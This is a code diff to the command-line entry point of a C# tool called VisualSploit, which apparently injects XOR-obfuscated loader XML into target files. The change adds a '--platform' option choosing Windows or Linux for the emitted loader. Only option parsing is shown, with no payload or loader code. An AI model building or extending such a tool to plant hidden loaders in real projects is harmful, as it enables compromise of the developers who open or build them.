@@ -4,7 +4,7 @@ namespace VisualSploit;
 
 class Program
 {
-    static int Main(string[] args)
+    internal static int Main(string[] args)
     {
         var targetArg = new Argument<FileInfo>("target")
         {
@@ -52,6 +52,13 @@ class Program
             Description = "RNG seed for reproducibility"
         };
 
+        var platformOption = new Option<TargetPlatform>("--platform")
+        {
+            Description = "Target platform for emitted loader",
+            HelpName = "windows|linux",
+            DefaultValueFactory = _ => TargetPlatform.Windows
+        };
+
         var dryRunOption = new Option<bool>("--dry-run", "-n")
         {
             Description = "Show injected XML without writing files"
@@ -70,6 +77,7 @@ class Program
             noBackupOption,
             roundsOption,
             seedOption,
+            platformOption,
             dryRunOption,
             verboseOption
         };
@@ -82,6 +90,7 @@ class Program
             var noBackup = ctx.GetValue(noBackupOption);
             var rounds = ctx.GetValue(roundsOption);
             var seed = ctx.GetValue(seedOption);
+            var platform = ctx.GetValue(platformOption);
             var dryRun = ctx.GetValue(dryRunOption);
             var verbose = ctx.GetValue(verboseOption);
 
@@ -91,6 +100,7 @@ class Program
                 OutputPath: output?.FullName,
                 XorRounds: rounds,
                 Seed: seed,
+                Platform: platform,
                 NoBackup: noBackup,
                 DryRun: dryRun,
                 Verbose: verbose);
